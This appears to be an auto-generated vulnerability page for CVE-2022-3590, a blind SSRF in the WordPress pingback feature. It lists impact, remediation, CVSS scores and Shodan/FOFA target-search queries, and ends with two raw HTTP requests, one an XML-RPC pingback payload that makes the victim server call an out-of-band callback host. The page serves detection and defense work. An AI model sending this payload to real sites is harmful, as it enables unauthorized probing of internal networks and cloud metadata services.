---
layout: "post"
cve_id: "CVE-2022-3590"
title: "WordPress <= 6.2 - Server Side Request Forgery"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-3590.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-3590.yaml"
author: "riteshs4hu"
severity: "medium"
impact: "Unauthenticated attackers can exploit a race condition in the WordPress pingback feature to perform blind SSRF attacks, potentially accessing internal network resources, cloud metadata endpoints, or other restricted internal services that are explicitly forbidden by validation checks.
"
remediation: "Update WordPress to version 6.0.3 or later that properly handles TOCTOU race conditions in the pingback feature.
"
reference:
  - "https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11"
  - "https://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 5.9, 'cve-id': 'CVE-2022-3590', 'cwe-id': 'CWE-367', 'epss-score': 0.86525, 'epss-percentile': 0.99387, 'cpe': 'cpe:2.3:a:wordpress:wordpress:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'wordpress', 'product': 'wordpress', 'shodan-query': ['cpe:"cpe:2.3:a:wordpress:wordpress"', 'http.component:"wordpress"'], 'fofa-query': 'body="oembed" && body="wp-"'}"
tags:
  - "cve"
  - "cve2022"
  - "wordpress"
  - "wpscan"
  - "ssrf"
  - "oast"
  - "oob"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
WordPress is affected by an unauthenticated blind SSRF in the pingback feature. Because of a TOCTOU race condition between the validation checks and the HTTP request, attackers can reach internal hosts that are explicitly forbidden.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
POST /xmlrpc.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.1 Safari/605.1.15
Connection: close
Content-Length: 310
Content-Type: text/xml
Accept-Encoding: gzip

<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>http://d5it58ple0o15t39542gygo3jzybrcu9f.oast.online/</string></value>
    </param>
    <param>
      <value><string>//?p=1</string></value>
    </param>
  </params>
</methodCall>
```

